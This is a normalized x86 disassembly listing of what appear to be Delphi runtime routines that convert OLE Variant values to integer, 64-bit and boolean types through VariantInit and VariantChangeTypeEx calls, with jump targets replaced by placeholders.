sub_40f2ec
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f330
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40f751
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f363 ]
mov eax [ ebp - 0x4 ]
call sub_40f198
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f198
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f330
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f24c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f288
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f2ec
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f24c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f24c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40f587 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402994
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f198
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f330
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030a4
sub_40f780
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e194
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40f80c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f330
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030a4
sub_40f830
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e194
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40f8b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f330
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030a4
sub_40f8d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40f9ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f330
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40f8fe ]
jmp [ eax * 4 + jump_table_40f910 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030a4
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e194
sub_40f9d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40fa85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f330
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40f9f2 ]
jmp [ eax * 4 + jump_table_40fa05 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030a4
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e194
sub_40faa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_40fb6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fdf4
test edx edx
je r-xdata
mov al [ eax + lookup_table_40face ]
jmp [ eax * 4 + jump_table_40fae2 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030a4
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e194
sub_40fb90
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402994
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40e5d4
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_4103f0
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_40fc3c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40fd2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412390
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404124
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408050
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd31
lea eax [ ebp - 0x1c ]
call sub_403e9c
lea eax [ ebp - 0xc ]
call sub_40457c
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402994
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40e5d4
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_4103f0
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_40fd3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fd93
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40eca0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_40fdf4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd9a
lea eax [ ebp - 0x18 ]
call sub_40e978
retn
sub_40fda8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_40fdf4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410200
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fe27 ]
mov eax [ ebp - 0x4 ]
call sub_40fc3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fdf4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e194
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40fda8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41004b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402994
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fdf4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410238
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4102ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412390
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404124
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_40813c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102f6
lea eax [ ebp - 0x10 ]
call sub_403e9c
lea eax [ ebp - 0x8 ]
call sub_40457c
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40e5d4
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40e5d4
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410300
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40e5d4
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410340
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410394
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40eca0
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_4103f0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41039b
lea eax [ ebp - 0x11 ]
call sub_40e978
retn
sub_4103a4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_4103f0
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41040a ]
mov eax ebx
call sub_410238
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410238
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4103f0
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410300
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410340
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e194
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4103a4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410300
mov [ esp ] al
mov eax ebx
call sub_410300
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4105cc ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
